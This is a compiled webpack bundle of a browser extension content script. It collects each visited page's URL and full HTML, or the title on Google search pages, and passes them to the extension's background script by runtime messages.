/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	// The require scope
/******/ 	var __webpack_require__ = {};
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
/*!******************************!*\
  !*** ./src/contentScript.ts ***!
  \******************************/
__webpack_require__.r(__webpack_exports__);

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'collectStatus') {
    if (message.collectStart) {
      collectAndSendData();
    }
  }
});
function collectAndSendData() {
  const url = window.location.href;
  const pageHTML = document.documentElement.innerHTML;
  chrome.runtime.sendMessage({
    action: 'sendPageData',
    data: {
      url,
      pageHTML
    }
  });
}
function collectPageText() {
  const url = window.location.href;
  if (!url.includes("https://www.google.com/search?")) {
    const pageHTML = document.documentElement.innerHTML;
    chrome.runtime.sendMessage({
      action: "sendText",
      html: pageHTML
    });
  } else {
    const searchText = document.title;
    chrome.runtime.sendMessage({
      action: "searchText",
      text: searchText
    });
  }
}
collectPageText();
/******/ })()
;
//# sourceMappingURL=contentScript.js.map